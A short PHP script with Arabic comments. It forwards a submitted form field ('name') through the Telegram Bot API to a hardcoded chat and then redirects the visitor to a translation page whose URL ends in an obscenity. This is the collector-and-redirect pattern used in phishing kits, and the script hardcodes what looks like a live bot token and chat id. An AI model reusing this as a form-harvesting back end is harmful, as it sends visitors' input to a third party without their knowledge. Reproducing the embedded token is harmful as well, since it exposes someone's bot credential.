<?php
// بداية الرسالة المرسلة إلى تليجرام
$message = "تم إرسال معلومات جديدة:" . PHP_EOL . PHP_EOL;

// استخراج المعلومات من النموذج المرسل
if(isset($_POST['name'])) {
    $name = $_POST['name'];
    $message .= "اسم المستعار: " . $name . PHP_EOL;
}

// رقم chat_id الخاص بالشخص المستهدف
$chat_id = '1953895963'; // استبدل CHAT_ID برقم الشخص المستهدف

// رابط معين ترغب في تحويل الشخص إليه
$link = "https://context.reverso.net/%D8%A7%D9%84%D8%AA%D8%B1%D8%AC%D9%85%D8%A9/%D8%A7%D9%84%D8%A5%D9%86%D8%AC%D9%84%D9%8A%D8%B2%D9%8A%D8%A9-%D8%A7%D9%84%D8%B9%D8%B1%D8%A8%D9%8A%D8%A9/fuck+you"; // استبدل example.com برابط الموقع المطلوب

// رسالة الإعلام للشخص المستهدف
$notification_message = "شكرًا لإرسال المعلومات! انتقل إلى الرابط التالي: " . $link;

// استدعاء واستخدام Telegram Bot API لإرسال الرسائل
$telegram_api_key = '5485610292:AAHN-lnS1Rwi9tj9JOwXj_6B1q18hqgV5wo'; // استبدل YOUR_TELEGRAM_API_KEY بمفتاح API الخاص بك

// إرسال رسالة الإعلام إلى الشخص المستهدف
$notification_data = [
    'chat_id' => $chat_id,
    'text' => $notification_message
];
file_get_contents("https://api.telegram.org/bot$telegram_api_key/sendMessage?" . http_build_query($notification_data));

// إرسال المعلومات إلى الشخص المستهدف
$data = [
    'chat_id' => $chat_id,
    'text' => $message
];
file_get_contents("https://api.telegram.org/bot$telegram_api_key/sendMessage?" . http_build_query($data));

// إعادة التوجيه إلى الرابط المعين
header("Location: $link");
exit();
?>
